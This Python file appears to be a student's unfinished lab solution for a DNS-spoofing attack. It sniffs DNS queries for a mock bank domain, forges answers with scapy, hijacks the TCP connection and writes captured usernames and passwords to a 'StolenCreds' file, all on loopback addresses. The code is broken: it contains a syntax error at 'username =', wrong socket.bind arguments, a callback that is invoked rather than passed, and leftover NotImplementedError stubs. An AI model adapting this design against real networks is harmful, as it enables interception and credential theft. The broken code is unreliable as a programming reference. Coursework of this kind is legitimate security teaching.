import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "LetumiBank.com"
HOST=''

IFACE = "lo"   # Or your default interface
DNS_SERVER_IP = "127.0.0.1"  # Your local IP

# 127.0.0.1 Client
# 127.0.0.3 Attaquer
# 127.1.1.1 Real Host

def resolve_hostname(hostname):
	# IP address of HOSTNAME. Used to forward tcp connection.
	# Normally obtained via DNS lookup.
	return "127.1.1.1"


def log_credentials(username, password):
	# Write stolen credentials out to file.
	# Do not change this.
	with open("lib/StolenCreds.txt", "wb") as fd:
		fd.write(str.encode("Stolen credentials: username=" + username + " password=" + password))


def check_credentials(client_data):
	# TODO: Take a block of client data and search for username/password credentials.
	# If found, log the credentials to the system by calling log_credentials().
	username =
	log_credentials(username,password)
	raise NotImplementedError


def handle_tcp_forwarding(client_socket, client_ip, hostname):
	# Continuously intercept new connections from the client
	# and initiate a connection with the host in order to forward data
	with client_socket :
		while True:
			# TODO: accept a new connection from the client on client_socket and
			# create a new socket to connect to the actual host associated with hostname.
			data = client_socket.recv(1024)
			if not data:
				break
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as host_socket:
				host_socket.connect((resolve_hostname(HOSTNAME), WEB_PORT))
				check_credentials(data)
				host_socket.sendall(data)


		# TODO: read data from client socket, check for credentials, and forward along to host socket.
		# Check for POST to '/post_logout' and exit after that request has completed.

		raise NotImplementedError


def dns_callback(packet, extra_args): # source_ip, our_socket
	# TODO: Write callback function for handling DNS packets.
	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
	queryName = packet[DNS].qd.qname
	if(queryName != HOSTNAME):
		return

	# Construct the DNS packet
	# # Construct the Ethernet header by looking at the sniffed packet
	# eth = Ether(
	# 	src=packet[Ether].dst,
	# 	dst=packet[Ether].src
	# )

	# Construct the IP header by looking at the sniffed packet
	ip = IP(
		src=packet[IP].dst,
		dst=packet[IP].src
	)

	# Construct the UDP header by looking at the sniffed packet
	udp = UDP(
		dport=packet[UDP].sport,
		sport=packet[UDP].dport
	)

	# Construct the DNS response by looking at the sniffed packet and manually
	dns = DNS(
		id=packet[DNS].id,
		qd=packet[DNS].qd,
		aa=1,
		rd=0,
		qr=1,
		qdcount=1,
		ancount=1,
		nscount=0,
		arcount=0,
		ar=DNSRR(
			rrname=packet[DNS].qd.qname,
			type='A',
			ttl=600,
			rdata=extra_args[0])
	)

	# Put the full packet together
	response_packet = ip / udp / dns

	# Send the DNS response
	send(response_packet, iface=IFACE)

	handle_tcp_forwarding(extra_args[1],packet[IP].src , queryName) # extra_args[0] can be replaced by packet[IP].src ; # source_ip, our_socket
	raise NotImplementedError


def sniff_and_spoof(source_ip):
	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
	# This socket will be used to accept connections from victimized clients.
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		s.bind(source_ip, WEB_PORT)
		s.listen()
		conn, addr = s.accept()

	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
	# and the socket you created as extra callback arguments.
	BPF_FILTER = f"udp port 53 and ip dst {DNS_SERVER_IP}"
	scapy.sniff(filter=BPF_FILTER,prn=dns_callback(source_ip,conn), iface=IFACE)



	raise NotImplementedError


def main():
	parser = argparse.ArgumentParser(description='Attacker who spoofs dns packet and hijacks connection')
	parser.add_argument('--source_ip', nargs='?', const=1, default="127.0.0.3", help='ip of the attacker')
	args = parser.parse_args()

	sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
	# Change working directory to script's dir.
	# Do not change this.
	abspath = os.path.abspath(__file__)
	dirname = os.path.dirname(abspath)
	os.chdir(dirname)
	main()
